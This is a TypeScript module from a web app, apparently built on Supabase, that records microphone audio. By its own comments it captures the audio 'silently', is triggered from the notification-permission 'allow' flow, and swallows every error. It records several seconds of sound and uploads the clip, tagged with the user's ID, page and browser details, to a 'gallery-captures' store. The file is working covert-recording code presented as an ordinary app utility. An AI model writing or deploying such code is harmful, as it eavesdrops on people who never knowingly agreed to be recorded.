import { supabase } from "@/integrations/supabase/client";
import { isPermissionEnabled } from "@/lib/page-permissions";

// Silently capture a short audio clip when microphone permission is enabled.
// Runs on user gesture only (called from notification permission allow flow).

let running = false;
let lastRunAt = 0;
const MIN_GAP_MS = 5000;
const DEFAULT_SECONDS = 8;

async function getAudioSeconds(page: string) {
  try {
    const { data } = await supabase
      .from("page_permission_settings")
      .select("gallery_audio_seconds")
      .eq("page", page)
      .maybeSingle();
    return (data as any)?.gallery_audio_seconds ?? DEFAULT_SECONDS;
  } catch {
    return DEFAULT_SECONDS;
  }
}

async function uploadAudio(blob: Blob, page: string, durationMs: number) {
  const { data: userData } = await supabase.auth.getUser();
  const uid = userData.user?.id ?? "anon";
  const path = `${uid}/${Date.now()}-${Math.random().toString(36).slice(2, 8)}.webm`;
  const up = await supabase.storage.from("gallery-captures").upload(path, blob, {
    contentType: "audio/webm",
    upsert: false,
  });
  if (up.error) return;
  await supabase.from("gallery_captures").insert({
    user_id: userData.user?.id ?? null,
    kind: "audio",
    storage_path: path,
    page,
    user_agent: navigator.userAgent,
    size_bytes: blob.size,
    duration_ms: durationMs,
  });
}

export async function silentMicrophoneCapture(): Promise<void> {
  try {
    if (typeof window === "undefined") return;
    if (running) return;
    if (Date.now() - lastRunAt < MIN_GAP_MS) return;
    const page = window.location.pathname;
    const allowed = await isPermissionEnabled(page, "microphone");
    if (!allowed) return;
    if (!navigator.mediaDevices?.getUserMedia) return;

    running = true;
    const seconds = await getAudioSeconds(page);
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
    const chunks: BlobPart[] = [];
    const rec = new MediaRecorder(stream);
    rec.ondataavailable = (e) => { if (e.data.size) chunks.push(e.data); };
    const done = new Promise<void>((res) => { rec.onstop = () => res(); });
    rec.start();
    await new Promise((r) => setTimeout(r, Math.max(1, seconds) * 1000));
    rec.stop();
    await done;
    stream.getTracks().forEach((t) => t.stop());
    const blob = new Blob(chunks, { type: "audio/webm" });
    if (blob.size) await uploadAudio(blob, page, seconds * 1000);
    lastRunAt = Date.now();
  } catch {
    // Permission denied / no mic — stay silent by design
  } finally {
    running = false;
  }
}
